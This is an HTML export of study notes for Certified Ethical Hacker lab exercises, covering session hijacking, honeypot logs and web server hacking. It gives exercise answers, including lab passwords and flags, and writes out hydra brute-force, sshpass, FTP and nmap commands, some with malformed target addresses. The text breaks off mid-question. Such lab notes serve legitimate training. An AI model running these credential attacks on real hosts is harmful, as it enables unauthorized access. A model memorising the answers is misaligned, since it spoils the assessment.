@@ -1,0 +1,731 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>CEH Engage - Part 3</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 111, 200, 0.09);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(134, 131, 126, 1);
+	fill: rgba(134, 131, 126, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(63, 126, 190, 1);
+	fill: rgba(63, 126, 190, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(232, 242, 250, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 99, 174, 0.172); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2803addf-00cb-80f8-b87a-e78d06a5fa4e" class="page sans"><header><h1 class="page-title">CEH Engage - Part 3</h1><p class="page-description"></p></header><div class="page-body"><p id="2813addf-00cb-80fd-b3a8-fedff738f665" class="">
+</p><p id="2803addf-00cb-809b-a211-f23166095e68" class="">Session Hijacking</p><p id="2813addf-00cb-8021-864e-d534d777f20a" class="">Evading IDS</p><p id="2813addf-00cb-806b-a17b-fe3ba5fc0cc4" class="">Firewalls and Honeypots</p><p id="2813addf-00cb-8010-a256-d1b377ad70a3" class="">Hacking Web Servers</p><p id="2813addf-00cb-80c2-ab78-de1ba1064555" class="">Hacking Web Applications</p><p id="2813addf-00cb-80b6-a8e1-d8ff123dc343" class="">SQL Injection</p><p id="2813addf-00cb-80b0-89bb-e726b13ef636" class="">
+</p><ol type="1" id="2813addf-00cb-80e5-858e-c8de399bc4f3" class="numbered-list" start="1"><li>An attacker tried to perform session hijacking on a machine from 172.30.10.0/24 subnet. An incident handler found a packet capture file $_Jack.pcapng obtained from the victim machine which is stored in Documents folder of EH Workstation -1. You are assigned to analyse the packet capture file and determine the IP of the victim machine targeted by the attacker. (Format: NNN.NN.NN.NNN)</li></ol><p id="2813addf-00cb-80f2-99bb-d8f956fd0880" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80a7-b6f0-d9efb2fc4a0e" class="">In wireshark, filter to <em><strong>tcp.analysis.flags </strong></em>and look for TCP retransmissions (black higlight red font) </p><p id="2813addf-00cb-80e8-b8d8-f39f395d7ebb" class="">THe non-server IP is the attacker</p></div></p><p id="2813addf-00cb-80a8-a4ce-c36fec1fc865" class="">Answer:<div class="indented"><p id="2813addf-00cb-8079-863c-f3f5a3aff12b" class="">172.30.10.200 </p><p id="2813addf-00cb-808c-b394-c4417dea6da0" class="">
+</p></div></p><ol type="1" id="2813addf-00cb-80b3-a0fa-c1df53d30abc" class="numbered-list" start="2"><li>An attacker tried to intercept a login session by intercepting the http traffic from the victim machine. The security analyst captured the traffic and stored it in Downloads folder of EH Workstation -1 as Intercep_$niffer.pcapng. Analyse the pcap file and determine the credentials captured by the attacker. (Format: aaa/aaaa)</li></ol><p id="2813addf-00cb-80b5-9404-c2a0394b9994" class="">Explanation: <div class="indented"><p id="2813addf-00cb-8014-a74b-c0c45bf640f3" class="">In Wireshark, filter to <em><strong>http &amp;&amp; ip.addr == &lt;victim IP&gt; </strong></em>(Here victim IP is the same as in #1 above</p><p id="2813addf-00cb-80e4-a771-cdffc630a60a" class="">or <em><strong>http.request.method == POST &gt; </strong></em>search for post login.aspx </p></div></p><p id="2813addf-00cb-806d-909a-cc7f7f31fd10" class="">Answer: <div class="indented"><p id="2813addf-00cb-8049-8d60-ff1c0a05d981" class="">lee/test</p></div></p><p id="2813addf-00cb-806c-aaa7-ca2fcc019b83" class="">
+</p><ol type="1" id="2813addf-00cb-80a9-95b0-fdfe25ef5e71" class="numbered-list" start="3"><li>A honeypot has been set up on a machine within the 192.168.10.0/24 subnet to monitor and detect malicious network activity. Your task is to analyze the honeypot log file, cowrie.log, located in the Downloads folder of EH Workstation -2, and determine the attacker IP trying to access the target machine. (Format: NNN*NN*NN*NN)</li></ol><p id="2813addf-00cb-804b-b763-d0e1ba6310c1" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80c1-b005-fcff6b739d4f" class="">In directory with log file: <em><strong>tail cowrie.log</strong></em></p><p id="2813addf-00cb-8073-b0b9-c00f3aee4b35" class="">or open with pluma or any other text editor</p><p id="2813addf-00cb-809e-9613-df07f3e1ce29" class="">View fialed authentications/login attempts from attacker IP </p></div></p><p id="2813addf-00cb-80fa-9985-fb069bddcf25" class="">Answer: <div class="indented"><p id="2813addf-00cb-8043-93b6-ec31bd711ae0" class="">172.30.10.99</p></div></p><p id="2813addf-00cb-809c-9368-e618bb4fa8e7" class="">
+</p><ol type="1" id="2813addf-00cb-80f1-ae1f-c7ce881148ed" class="numbered-list" start="4"><li>Conduct a footprinting analysis on the target website www.certifiedhacker.com to identify the web server technology used by the site. (Format: Aaaaaa)</li></ol><p id="2813addf-00cb-8079-ac3e-c6ca50ceab3b" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80f0-9596-ddcb597dc677" class=""><em><strong>nc -vv www.moviescope.com 80</strong></em></p><p id="2813addf-00cb-80c5-85ed-c0033afbc9eb" class=""><em><strong>GET / HTTP/1.0  → Enter x2</strong></em></p><p id="2813addf-00cb-80db-a2ee-d1c4e27dcef3" class="">or</p><p id="2813addf-00cb-8054-baf2-c55c97b8f7cd" class=""><em><strong>telnet </strong></em><em><strong><a href="http://www.moviescope.com/">www.moviescope.com</a></strong></em><em><strong> 80</strong></em></p><p id="2813addf-00cb-80a2-b26c-c752cb6f0565" class=""><em><strong>GET / HTTP/1.0  → Enter x2</strong></em></p><p id="2813addf-00cb-8086-837f-f6fc27c3b812" class="">or</p><p id="2813addf-00cb-80d0-9f00-fc8ccd859b78" class="">NSE: <em><strong>nmap -sV --script=http-enum &lt;target website&gt;</strong></em></p></div></p><p id="2813addf-00cb-80e2-b429-c398ee33432a" class="">
+</p><p id="2813addf-00cb-80e8-9784-d168444d8779" class="">Answer: <div class="indented"><p id="2813addf-00cb-804a-be80-fa34f58f4962" class="">Apache</p><p id="2813addf-00cb-80e5-b0fd-c75d6d8af59f" class="">
+</p></div></p><ol type="1" id="2813addf-00cb-8023-b5d1-d1ca824fc7fe" class="numbered-list" start="5"><li>You’re a cybersecurity investigator assigned to a high-priority case. Martin is suspected of engaging in illegal crypto activities, and it’s believed that he has stored his crypto account password in a file named $ollers.txt. Your mission is to crack the SSH credentials for Martin’s machine within the 192.168.10.0/24 subnet and retrieve the password from the $ollers.txt file. (Hint: Search in the folders present on the Desktop to find the target file) (Format: aNaa**NNNNNAA*)</li></ol><p id="2813addf-00cb-80cb-9ae3-ef649ff384f6" class="">
+</p><p id="2813addf-00cb-8088-9237-dbda91e15528" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80ff-aef6-f24b1988247d" class="">Run nmap scan to determine open SSH service on target subnet if not done already: <em><strong>nmap -p 22 192.168.10.* --open</strong></em></p><p id="2813addf-00cb-804e-a6c3-f3dfdc42a868" class=""><em><strong>hydra -L Martin -P password.txt 192.168.101 ssh</strong></em></p><p id="2813addf-00cb-804b-8635-db9772ffc58b" class="">Connect to system via ssh: <em><strong>sshpass -p qwerty1234 ssh Martin@192.168.10.101</strong></em></p><p id="2813addf-00cb-800d-8709-e613af9d60d3" class=""><em><strong>cd </strong></em>to Desktop → <em><strong>dir </strong></em>to list contents → see $ollers.txt</p><p id="2813addf-00cb-80e6-a97d-c997c14bae53" class=""><em><strong>type $ollers.txt </strong></em>to list contents of file </p></div></p><p id="2813addf-00cb-804b-b061-fc209ca38408" class="">Answer: <div class="indented"><p id="2813addf-00cb-802b-8c9f-f3870608d12b" class="">i2tr&amp;^72546HJ*</p></div></p><p id="2813addf-00cb-8035-a10b-ddd47d7f1db9" class="">
+</p><ol type="1" id="2813addf-00cb-8082-b0ef-f51e9a007188" class="numbered-list" start="6"><li>Attackers have identified a vulnerable website and stored the details of this website on one of the machines within the 192.168.10.0/24 subnet. As a cybersecurity investigator you have been tasked to crack the FTP credentials of user nick and determine the ID of the domain. The information you need has been gathered and stored in the w_domain.txt file. (Format: NNNNNNNNNN)</li></ol><p id="2813addf-00cb-800f-a757-cf090940e2fc" class="">
+</p><p id="2813addf-00cb-8049-b735-e2afadb9f441" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80b2-92cf-eee380a7ab2e" class=""><em><strong>nmap -p 21 192.168.10.* --open</strong></em></p><p id="2813addf-00cb-80cb-a400-ec063e4f111a" class=""><em><strong>hydra -L nick -P password.txt 192.168.111 ftp</strong></em></p><p id="2813addf-00cb-80d6-9f7d-c0f96255f13d" class="">See un/pw: nick/apple</p><p id="2813addf-00cb-80ea-8797-f2df494ea3e0" class=""><em><strong>ftp nick@192.168.10.111 → apple</strong></em></p><p id="2813addf-00cb-801c-84f9-c3ed57ef30c7" class=""><em><strong>cd Desktop → dir → get w_domain.txt</strong></em></p><p id="2813addf-00cb-80b4-ba46-d7448b50094b" class="">Read domain.txt on local machine</p><p id="2813addf-00cb-8038-86eb-df933a7b1cad" class="">See “id” on line 3</p></div></p><p id="2813addf-00cb-80c4-9cfe-fe29dae6fdf0" class="">Answer: <div class="indented"><p id="2813addf-00cb-8007-bfff-df2f80e0cc0a" class="">7867721010</p></div></p><p id="2813addf-00cb-805f-a78c-c15fdabfe93c" class="">
+</p><ol type="1" id="2813addf-00cb-80d7-adf8-e97f7e814bf3" class="numbered-list" start="7"><li>You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)</li></ol><p id="2813addf-00cb-802f-9ad8-fa10756a1ada" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80a7-9ade-dc19bbfe8b02" class="">No Linux server found with open port 8080</p></div></p><p id="2813addf-00cb-806a-b298-e8b6acec39fc" class="">
+</p><ol type="1" id="2813addf-00cb-80ab-a070-e22f585766c4" class="numbered-list" start="8"><li>You are a penetration tester assigned to a new task. A list of websites is stored in the webpent.txt file on the target machine with the IP address 192.168.10.101. Your objective is to find the Meta-Author of the website that is highlighted in the list. (Hint: Use SMB service) (Format: AA-Aaaaaaa)</li></ol><p id="2813addf-00cb-8056-9b11-c4bc317a9d1f" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80fd-b429-ca999ebd195d" class="">Connect to target via ssh credentials obtained in 5 </p><p id="2813addf-00cb-80b6-9012-fad664fd78ac" class="">Navigate to music directory and see file </p><p id="2813addf-00cb-80e9-8827-cfe7796c9b97" class=""><em><strong>whatweb “www.moviescope.com”</strong></em></p></div></p><p id="2813addf-00cb-80e5-8e3c-cef69ccef7d0" class="">Answer: <div class="indented"><p id="2813addf-00cb-80eb-95d1-e77b63409f46" class="">EC-Council</p></div></p><p id="2813addf-00cb-80a0-9e60-ee0de58dc38e" class="">
+</p><ol type="1" id="2813addf-00cb-8087-aaab-d0f0ed259291" class="numbered-list" start="9"><li>You have recently joined GoodShopping Inc. as a web application security administrator. Eager to understand the security landscape of the company’s website, www.goodshopping.com, you decide to investigate the security updates that have been made over time. Your specific task is to identify the attack category of the oldest Common Vulnerabilities and Exposures (CVEs) affected the website. (Format: aaaaa*aaaa aaaaaaaaaa (AAA) )</li></ol><p id="2813addf-00cb-8087-bab6-ea0f94377db2" class="">
+</p><p id="2813addf-00cb-8025-9f8a-dab430db2ef6" class="">Explanation: <div class="indented"><p id="2813addf-00cb-80d9-b213-e9126c9be8bb" class=""><em><strong>pip install wapiti3</strong></em></p><p id="2813addf-00cb-80fb-919d-fccf5c9055fa" class=""><em><strong>wapiti -u https://&lt;targetwebsite&gt;</strong></em></p><p id="2813addf-00cb-8071-a129-c5c2cc322aba" class=""><em><strong>cd </strong></em>to generated report path (listed in output) </p><p id="2813addf-00cb-800c-9047-fcfec870b85e" class=""><em><strong>cp </strong></em>file to /home/attacker/Desktop</p><p id="2813addf-00cb-80df-b625-eef333f45495" class="">Open with Firefox </p><p id="2813addf-00cb-8093-af41-f2c116358426" class="">Unclear how to determine “oldest CVE” </p></div></p><p id="2813addf-00cb-80ff-8c1d-c8140b4e80df" class="">Answer:<div class="indented"><p id="2813addf-00cb-80f0-ac54-d8b045542691" class="">Unclear how to determine “oldest CVE” </p><p id="2813addf-00cb-80a3-9b18-cdfce8b737c9" class="">
+</p></div></p><ol type="1" id="2813addf-00cb-80ee-a5f5-c0a63b26fad5" class="numbered-list" start="10"><li>You are a web penetration tester hired to assess the security of the website <a href="http://www.goodshopping.com/">www.goodshopping.com</a>. Your primary task is to identify the type of security policies is missing to detect and mitigate Cross-Site Scripting (XSS) and SQL Injection attacks. (Format: Aaaaaaa Aaaaaaaa Aaaaaa)</li></ol><p id="2813addf-00cb-80ac-aa34-d00eeb7936cc" class="">
